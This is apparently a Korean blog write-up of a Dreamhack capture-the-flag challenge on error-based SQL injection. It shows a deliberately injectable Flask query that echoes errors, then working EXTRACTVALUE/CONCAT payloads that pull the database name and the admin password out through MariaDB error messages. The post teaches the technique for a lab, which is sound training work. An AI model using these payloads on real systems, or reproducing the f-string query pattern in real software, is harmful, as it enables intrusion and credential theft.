---
layout: post
title: Dreamhack | error based sql injection
subtitle: Dreamhack Error Based SQLi
categories: dreamhack.io
tags: [Pentest, Web]
---
 
**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/217181542-3c1d2ee5-4762-43df-807a-218208af2d4e.png" width = 500> 
</p>

해당 문제는 SQL 심화 과정에 대한 문제입니다. 간단한 **Error Base SQLi** 문제라 합니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/217181793-19911960-90f0-420b-9032-93816300092a.png" width = 500> 
</p>

**EditText**를 통해서 입력되는 값이 아래의 쿼리로 진행되는 것을 문제에서 알려줍니다.

```sql
SELECT * FROM user WHERE uid='{uid}';
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/217182008-baa788ff-c6bc-412e-aeb1-4f14bf7766d8.png" width = 500> 
</p>

입력했던 값이 GET 메소드를 이용해 `uid` 변수에 들어가고 입력 값에 따라 쿼리도 변하는 것을 알 수 있습니다.

## 문제 풀이

제공되는 파일에는 `init.sql, app.py` 두 가지가 있기에 분석 해보겠습니다.

### init.sql

```sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
FLUSH PRIVILEGES;
```

`users`라는 DB가 존재하지 않으면 `users`로 DB를 만들며 `users` DB를 사용하고, `user` 테이블에 `uid, upw` 계졍의 정보가 담겨 있습니다.

|ID|PW|
|:--:|:--:|
|admin|**FLAG**|
|guest|guest|
|test|test|

### app.py

```python
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template
```

**GET, POST** 두 가지 메소드를 이용하고 `uid` 변수를 통해서 값을 받으면 쿼리를 진행하는데 에러가 발생할 경우 해당 에러 내용을 return 하는 것으로 되어 있습니다.

쿼리에 대해 에러를 쉽게 내는 방법으로는 싱글 혹은 더블 쿼테이션을 적용하여 쿼리 문을 이상하게 만드는 방법이 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/217185910-2eb0a28a-03cf-4081-a416-f6b8388096f7.png" width = 500> 
</p>

단순하게 `'` 하나 대입하였을 때 쿼리에 대한 에러 내용을 출력해주는 것을 알 수 있다. 여기서는 **MariaDB**를 사용하고 있다는 정보를 얻을 수 있다.

SQLi를 통해서 우리가 사용중인 데이터베이스명이 `users`가 맞는지 확인해보겠습니다.

사용할 함수로는 `extractvaule, concat`입니다.

* **extractvalue** : 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출합니다. 만약, 두 번째 인자가 올바르지 않은 XPATH 식일 경우 올바르지 않은 XPATH 식이라는 에러 메시지와 함께 잘못된 식을 출력합니다. **즉, 첫 번째 인자에 XPATH가 아닌 정수 값, 두 번째 인자에는 우리가 알고자 하는 값을 입력합니다.**

* **concat** : 첫 번째 인자와 두 번째 인자의 문자열을 하나로 합쳐주는 함수로 **extractvalue**에서 항상 에러가 날 수 있도록 `:`을 붙여주는 용도로 사용합니다.

```sql
admin' AND EXTRACTVALUE(1, CONCAT(0x3a, DATABASE())) #
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/217190765-c1a37cad-28cf-4346-ac51-1b2db82f8bce.png" width = 300> 
</p>

`users`로 제대로 된 값이 나오는 것을 확인할 수 있으니, 바로 `admin`의 upw를 뽑아보겠습니다.

```sql
admin' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT upw FROM user WHERE uid = 'admin'))) #
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/217194290-3ec05485-8caf-4f0b-a7d4-33d9a3c8e2b3.png" width = 450> 
</p>

하지만 모든 글자가 다 나오지 않은 것으로 보입니다. 글자 수를 뽑아보겠습니다.

```sql
admin' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT LENGTH(upw) FROM user WHERE uid = 'admin'))) #
```

총 44자리인데 FLAG를 뽑았을 때는 31자리밖에 나오질 않습니다. `RIGHT`를 이용해서 오른쪽부터의 값을 뽑는 방법으로 FLAG를 가져와서 해결하였습니다.

```sql
admin' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT RIGHT(upw, 30) FROM user WHERE uid = 'admin'))) #
```

* **참고**

   * [BugBountyClub](https://www.bugbountyclub.com/pentestgym/view/53)